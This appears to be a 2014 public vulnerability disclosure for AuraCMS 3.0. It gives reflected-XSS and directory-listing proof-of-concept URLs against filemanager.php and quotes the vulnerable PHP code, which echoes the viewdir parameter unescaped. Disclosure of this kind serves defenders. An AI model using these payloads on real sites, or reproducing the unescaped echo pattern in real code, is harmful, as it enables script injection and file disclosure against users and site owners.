@@ -1,0 +1,86 @@
+# Exploit Title: AuraCMS 3.0 Multiple Vulnerabilities
+# Date: 05/28/2014
+# Author: Mustafa ALTINKAYNAK
+# Download URL :http://auracms.org/
+# Software Link: http://codeload.github.com/auracms/AuraCMS/zip/master
+# Vuln Category: CWE-79 (XSS) - CWE-98 (LFI)
+# Tested on: AuraCMS 3.0
+# Tested Local Platform : XAMP on Windows 8
+# Patch/ Fix: Not published.
+---------------------------
+ 
+Technical Details
+---------------------------
+1) Reflected XSS : FileManager is a parameter unfiltered view of the file.  
+Ex: filemanager.php?viewdir="><script>alert('Mustafa');</script>
+
+2) LFI (Local File Include) : Directory listing is done.  
+Ex : filemanager.php?viewdir=/home
+
+---------------------------------------------------------------------------------
+# filemanager.php (Between 263,311 line)
+Example : domain.com/auracms/filemanager.php?viewdir=request
+280 line : <input type="hidden" value="<?php echo $_GET['viewdir']; ?>" name="return" />
+
+Example 2 : domain.com/auracms/filemanager.php?viewdir="><script>alert("mustafa");</script>
+<input type="hidden" value="<script>alert("mustafa");</script>" name="return" />
+
+Example 3 : domain.com/auracms/filemanager.php?viewdir=<script>alert("mustafa");</script>
+<input type="hidden" value=" "><script>alert("mustafa");</script>" name="return" /> Bingooo :)
+
+<?php
+if(isset($_GET['viewdir'])) {
+?>
+		<ul id="browser-toolbar">
+			<li class="file-new"><a href="#" title="<?php echo $lng['new_file_title']; ?>" onclick="toggle_visibility('load-file'); return false;"><?php echo $lng['new_file']; ?></a></li>
+			<li class="folder-new"><a href="#" title="<?php echo $lng['new_folder_title']; ?>" onclick="create_folder('<?php echo $_GET['viewdir']; ?>'); return false;"><?php echo $lng['new_folder']; ?></a></li>
+ 			<li class="folder-delete"><a href="#" title="<?php echo $lng['delete_folder_title']; ?>" onclick="delete_folder('<?php echo $_GET['viewdir']; ?>');"><?php echo $lng['delete_folder']; ?></a></li>
+			<li class="file-refresh"><a href="#" title="<?php echo $lng['refresh_files_title']; ?>" onclick="load('filemanager.php?viewdir=<?php echo $_GET['viewdir']; ?>','view-files'); return false;"><?php echo $lng['refresh']; ?></a></li>
+		</ul>
+		
+		<div id="current-loction">
+		  <?php echo htmlspecialchars($root_path . '/' . $_GET['viewdir'] . '/'); ?>
+		</div>
+		
+		<form style="display: none;" id="load-file" action="" class="load-file" method="post" enctype="multipart/form-data">
+
+			<fieldset>
+			  <legend><?php echo $lng['new_file_title']; ?></legend>
+				<input type="hidden" value="<?php echo $_GET['viewdir']; ?>" name="return" />
+				<label><?php echo $lng['form_file']; ?><input type="file" name="new_file" /></label>
+			</fieldset>
+			
+			<fieldset>
+			  <legend><?php echo $lng['new_file_manipulations']; ?></legend>
+			  <table>
+					<tr>
+						<td><label for="new_resize"><?php echo $lng['form_width']; ?></label></td>
+						<td><input type="text" class="number" maxlength="4" id="new_resize" name="new_resize" value="" /> px</td>
+					</tr>
+					<tr>
+						<td><label for="new_rotate"><?php echo $lng['form_rotate']; ?></label></td>
+						<td>
+							<select id="new_rotate" name="new_rotate">
+							  <option value="0"></option>
+							  <option value="90">90</option>
+							  <option value="180">180</option>
+							  <option value="270">270</option>
+							</select>
+						</td>
+					</tr>
+					<tr>
+						<td></td>
+						<td><input type="checkbox" class="checkbox" id="new_greyscale" name="new_greyscale" /><label for="new_greyscale"><?php echo $lng['form_greyscale']; ?></label></td>
+					</tr>
+			  </table>
+			</fieldset>
+			
+			<input type="submit" id="insert" value="<?php echo $lng['form_submit']; ?>" />
+			
+		</form>
+<?php } ?>
+-----------
+
+Mustafa ALTINKAYNAK
+twitter : @m_altinkaynak <http://twitter.com/m_altinkaynak>
+www.mustafaaltinkaynak.com
